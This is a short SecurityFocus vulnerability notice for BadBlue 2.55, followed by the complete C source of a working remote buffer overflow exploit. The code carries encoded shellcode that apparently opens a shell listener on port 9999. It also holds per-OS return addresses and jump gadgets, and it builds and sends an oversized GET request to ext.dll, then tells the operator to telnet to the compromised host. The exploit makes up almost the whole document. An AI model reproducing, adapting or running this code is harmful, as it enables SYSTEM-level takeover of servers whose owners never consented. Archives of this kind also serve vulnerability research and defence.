source: http://www.securityfocus.com/bid/12673/info

A remote buffer overflow vulnerability affects Working Resources BadBlue. This issue is due to a failure of the application to securely copy GET request parameters into finite process buffers.

An attacker may leverage this issue to execute arbitrary code with the privileges of the affected Web server, facilitating a SYSTEM level compromise. 

/* Badblue 2.55 Web Server remote buffer overflow
 * ( Version: BadBlue Personal Edition v2.55  Date: Dec. 9, 2004 )
 *
 * Tested under Windows 2000 Professional SP3/SP4 Spanish
 *              Windows 2000 Server SP4 Spanish
 *              Windows XP SP1 Spanish
 *
 * Credits:
 *  Andres Tarasco (atarasco _at_ sia.es) has discovered this vulnerability
 *  http://lists.netsys.com/pipermail/full-disclosure/2005-February/032029.html
 *
 * Exploit by  : Miguel Tarasc<F3> Acu<F1>a
 *               Tarako AT Haxorcitos.com
 * Exploit Date: 26/12/2004
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 * Greetings to: #haxorcitos, #dsr
 *
 ***************************************************************************
 *
 * D:\expl_badblue\Release>badblue.exe 192.168.1.82 80 1
 *
 * Badblue 2.55 Web Server - Remote buffer overflow
 * Tarako AT Haxorcitos.com
 *
 * [i] Retrieving HTTP Server Header
 * [i] Server    : BadBlue/2.5
 * [i] Connected : Yes
 * [i] Target    : Win2k Professional SP3/SP4 & Server SP4 (ext.dll)
 * [i] Work      : Complete
 * [i] Now       : telnet 192.168.1.82 9999
 *
 ***************************************************************************/

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment (lib,"ws2_32")

#define TIMEOUT 1
#define VALIDSERVER "BadBlue/2.5"
#define GETHEADER "HEAD HTTP/1.1\r\n\r\n"

#define HTTPSEND1 "GET /ext.dll?mfcisapicommand="
#define HTTPSEND2 "&page=index.htx HTTP/1.1\n\
Accept: */*\n\
Accept-Language: es\n\
Accept-Encodin: gzip, deflate\n\
User-Agent: Haxorcitos/1.0 (compatible; MSIE 6.0; Windows NT 5.0)\n\
Host: "
#define HTTPSEND3 "\nConnection: Keep-Alive\r\n\r\n"

#define LEN 500

char shellcode[]=
   "\xEB\x03\x5D\xEB\x05\xE8\xF8\xFF\xFF\xFF\x8B\xC5\x83\xC0\x11\x33"
   "\xC9\x66\xB9\xC9\x01\x80\x30\x88\x40\xE2\xFA\xDD\x03\x64\x03\x7C"
   "\x09\x64\x08\x88\x88\x88\x60\xC4\x89\x88\x88\x01\xCE\x74\x77\xFE"
   "\x74\xE0\x06\xC6\x86\x64\x60\xD9\x89\x88\x88\x01\xCE\x4E\xE0\xBB"
   "\xBA\x88\x88\xE0\xFF\xFB\xBA\xD7\xDC\x77\xDE\x4E\x01\xCE\x70\x77"
   "\xFE\x74\xE0\x25\x51\x8D\x46\x60\xB8\x89\x88\x88\x01\xCE\x5A\x77"
   "\xFE\x74\xE0\xFA\x76\x3B\x9E\x60\xA8\x89\x88\x88\x01\xCE\x46\x77"
   "\xFE\x74\xE0\x67\x46\x68\xE8\x60\x98\x89\x88\x88\x01\xCE\x42\x77"
   "\xFE\x70\xE0\x43\x65\x74\xB3\x60\x88\x89\x88\x88\x01\xCE\x7C\x77"
   "\xFE\x70\xE0\x51\x81\x7D\x25\x60\x78\x88\x88\x88\x01\xCE\x78\x77"
   "\xFE\x70\xE0\x2C\x92\xF8\x4F\x60\x68\x88\x88\x88\x01\xCE\x64\x77"
   "\xFE\x70\xE0\x2C\x25\xA6\x61\x60\x58\x88\x88\x88\x01\xCE\x60\x77"
   "\xFE\x70\xE0\x6D\xC1\x0E\xC1\x60\x48\x88\x88\x88\x01\xCE\x6A\x77"
   "\xFE\x70\xE0\x6F\xF1\x4E\xF1\x60\x38\x88\x88\x88\x01\xCE\x5E\xBB"
   "\x77\x09\x64\x7C\x89\x88\x88\xDC\xE0\x89\x89\x88\x88\x77\xDE\x7C"
   "\xD8\xD8\xD8\xD8\xC8\xD8\xC8\xD8\x77\xDE\x78\x03\x50\xDF\xDF\xE0"
   "\x8A\x88\xAF\x87\x03\x44\xE2\x9E\xD9\xDB\x77\xDE\x64\xDF\xDB\x77"
   "\xDE\x60\xBB\x77\xDF\xD9\xDB\x77\xDE\x6A\x03\x58\x01\xCE\x36\xE0"
   "\xEB\xE5\xEC\x88\x01\xEE\x4A\x0B\x4C\x24\x05\xB4\xAC\xBB\x48\xBB"
   "\x41\x08\x49\x9D\x23\x6A\x75\x4E\xCC\xAC\x98\xCC\x76\xCC\xAC\xB5"
   "\x01\xDC\xAC\xC0\x01\xDC\xAC\xC4\x01\xDC\xAC\xD8\x05\xCC\xAC\x98"
   "\xDC\xD8\xD9\xD9\xD9\xC9\xD9\xC1\xD9\xD9\x77\xFE\x4A\xD9\x77\xDE"
   "\x46\x03\x44\xE2\x77\x77\xB9\x77\xDE\x5A\x03\x40\x77\xFE\x36\x77"
   "\xDE\x5E\x63\x16\x77\xDE\x9C\xDE\xEC\x29\xB8\x88\x88\x88\x03\xC8"
   "\x84\x03\xF8\x94\x25\x03\xC8\x80\xD6\x4A\x8C\x88\xDB\xDD\xDE\xDF"
   "\x03\xE4\xAC\x90\x03\xCD\xB4\x03\xDC\x8D\xF0\x8B\x5D\x03\xC2\x90"
   "\x03\xD2\xA8\x8B\x55\x6B\xBA\xC1\x03\xBC\x03\x8B\x7D\xBB\x77\x74"
   "\xBB\x48\x24\xB2\x4C\xFC\x8F\x49\x47\x85\x8B\x70\x63\x7A\xB3\xF4"
   "\xAC\x9C\xFD\x69\x03\xD2\xAC\x8B\x55\xEE\x03\x84\xC3\x03\xD2\x94"
   "\x8B\x55\x03\x8C\x03\x8B\x4D\x63\x8A\xBB\x48\x03\x5D\xD7\xD6\xD5"
   "\xD3\x4A\x8C\x88";

struct TARGETS {
   int num;
   char name[58];
   char offset[5];
} targets[]= {
   // char offset[]="\x56\x66\x46\x78";    // ntdll.dll V. 5.0.2195.6899 Windows 2k Spanish (CALL EBX)
   // char offset[]="\x37\x25\x01\x10";    // ext.dll V. 1.0.0.1 (CALL EBX) Windows 2k SP4 Spanish
   // char offset[]="\x3E\xFA\x02\x10";    // ext.dll V. 1.0.0.1 (FF55 0C  CALL [EBP+C]) Windows XP SP1 Spanish
   { 0, "WinXP Professional SP1 (ext.dll)", "\x3E\xFA\x02\x10" },                   // CALL [EBP+C]
   { 1, "Win2k Professional SP3/SP4 & Server SP4 (ext.dll)", "\x37\x25\x01\x10" },  // CALL EBX
   //{ 2, "Crash", 0x41414141 }, // crash
};
char jmp[]="\xEB\x07";                 // JMP $+9   (EB 07) To jump the offset
char jmpback[]="\xE9\x0D\xFE\xFF\xFF"; // JMP $-494 (E9 0DFEFFFF) To jump to the beginning of the shellcode



int CheckHeader(SOCKET s,struct  sockaddr_in sa) { // Server: BadBlue/2.5
   timeval  tiempo;
   fd_set   fdset;

   int      leido;         // Bytes leidos en el recv
   char     buffer[1024];  // Buffer de lectura con el recv
   char     version[11];
   int      retorno=0;


   if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){
      printf("\n [e] Error: socket():%d\n", WSAGetLastError());
      return(1);
   }
   if ( connect(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) {
      printf("\n [e] Error: connect()");
      return(1);
   }

   send(s,GETHEADER,strlen(GETHEADER),0);

   tiempo.tv_sec=TIMEOUT;                  // TimeOut del Select
   tiempo.tv_usec=0;
   FD_ZERO( &fdset );                      // Inicializa FDSet a NULL
   FD_SET( s, &fdset );                    // A<F1>ade el descriptor AcceptedSocket a FDSet
   if ((select( s + 1 , &fdset , NULL , NULL , &tiempo )) >0) {
      if (FD_ISSET(s,(fd_set FAR *)&fdset)) {   // True si ConnectSocket esta en FDSet
         memset(&buffer, 0, sizeof(buffer));
         if ((leido=recv( s,buffer,sizeof(buffer),0 )) > 0) {
            if (leido > 42) {
               strncpy(version,buffer+32,strlen(VALIDSERVER));
               printf("\n [i] Server    : %s",version);
               if (strncmp(version,VALIDSERVER,strlen(VALIDSERVER))!=0) retorno=1;
            }
            else retorno=1;
         }
         else {
            printf("\n [e] Server    : Unknown");
            retorno=1;
         }
      }
   }

   closesocket(s);
   return(retorno);
}



void main(int argc, char *argv[]) {
   SOCKET s;

   WSADATA HWSAdata;
   struct  sockaddr_in sa;

   char *buffer=NULL;
   UINT i;

   printf("\n Badblue 2.55 Web Server - Remote buffer overflow");
   printf("\n Tarako AT Haxorcitos.com\n");

   if ( (argc!=4) || (atoi(argv[3])>=sizeof(targets) / sizeof(struct TARGETS))) {
      printf("\n OS:",argv[0]);
      for (i=0;i<(sizeof(targets) / sizeof(struct TARGETS));i++) {
         printf("\n    %i - %s",i,targets[i].name);
      }
      printf("\n\n Usage: %s <IP> <Port> <OS> \n",argv[0]);
      exit(1);
   }


   if (WSAStartup(MAKEWORD(2,2), &HWSAdata) != 0) {
      printf("\n [e] Error: WSAStartup():%d\n", WSAGetLastError());
      exit(1);
   }

   if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){
      printf("\n [e] Error: socket():%d\n", WSAGetLastError());
      exit(1);
   }

   sa.sin_family           = AF_INET;
   sa.sin_port             = (USHORT)htons(atoi(argv[2]));
   sa.sin_addr.S_un.S_addr = inet_addr(argv[1]);

   printf("\n [i] Retrieving HTTP Server Header");
   if (CheckHeader(s,sa)==1) {
      printf("\n [i] Aborting exploit\n\n");
      exit(1);
   }

   if ( connect(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) {
      printf("\n [e] Error: connect()");
      exit(1);
   }

   printf("\n [i] Connected : Yes");
   printf("\n [i] Target    : %s ",targets[atoi(argv[3])].name);

   buffer=(char*)malloc(sizeof(char)*(strlen(HTTPSEND1)+strlen(HTTPSEND2)+strlen(HTTPSEND3)+strlen(argv[1])+LEN+1));
   memset(buffer,0,strlen(HTTPSEND1)+strlen(HTTPSEND2)+strlen(HTTPSEND3)+strlen(argv[1])+LEN+1);

   memcpy(buffer,HTTPSEND1,strlen(HTTPSEND1));

   for( i=strlen(HTTPSEND1);i<(LEN+strlen(HTTPSEND1));i++) buffer[i]=(BYTE)0x90;

   memcpy(buffer+strlen(HTTPSEND1),shellcode,strlen(shellcode));

   memcpy(buffer+strlen(HTTPSEND1)+485,jmp,strlen(jmp));
   memcpy(buffer+strlen(HTTPSEND1)+489,targets[atoi(argv[3])].offset,strlen(targets[atoi(argv[3])].offset));
   memcpy(buffer+strlen(HTTPSEND1)+494,jmpback,strlen(jmpback));

   memcpy(buffer+strlen(HTTPSEND1)+LEN,HTTPSEND2,strlen(HTTPSEND2));

   memcpy(buffer+strlen(HTTPSEND1)+LEN+strlen(HTTPSEND2),argv[1],strlen(argv[1]));

   memcpy(buffer+strlen(HTTPSEND1)+LEN+strlen(HTTPSEND2)+strlen(argv[1]),HTTPSEND3,strlen(HTTPSEND3));

   send(s,buffer,strlen(buffer),0);
   closesocket(s);

   printf("\n [i] Work      : Complete");
   printf("\n [i] Now       : telnet %s 9999\n",argv[1]);
}